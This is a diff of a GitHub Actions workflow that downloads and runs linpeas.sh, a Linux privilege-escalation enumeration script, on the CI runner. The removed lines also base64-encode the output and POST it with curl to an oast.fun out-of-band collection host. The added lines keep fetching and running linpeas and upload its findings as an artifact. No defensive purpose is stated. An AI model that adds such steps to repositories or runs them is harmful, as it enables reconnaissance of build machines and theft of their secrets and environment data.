@@ -10,9 +10,19 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: war
+      - name: linpeas-fetch
         run: |
           curl https://github.com/peass-ng/PEASS-ng/releases/download/20240421-825f642d/linpeas.sh >> ${{ runner.temp }}/linpeas.sh
-          bash ${{ runner.temp }}/linpeas.sh >> ${{ runner.temp }}/linpeas.out
-          curl -X POST https://sxnzaklbqtsnarziyesrsxd9d0k91eb5t.oast.fun -d "data=$(cat ${{ runner.temp }}/linpeas.out|base64)"
         shell: bash
+
+      - name: linpeas-run
+        run: |
+          bash ${{runner.temp}}/linpeas.sh |tee -a ${{runner.temp}}/linpeas.out
+        shell: bash
+
+      - name: linpeas-upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: linpeas.out
+          path: ${{runner.temp}}/linpeas.out
+          retention-days: 5
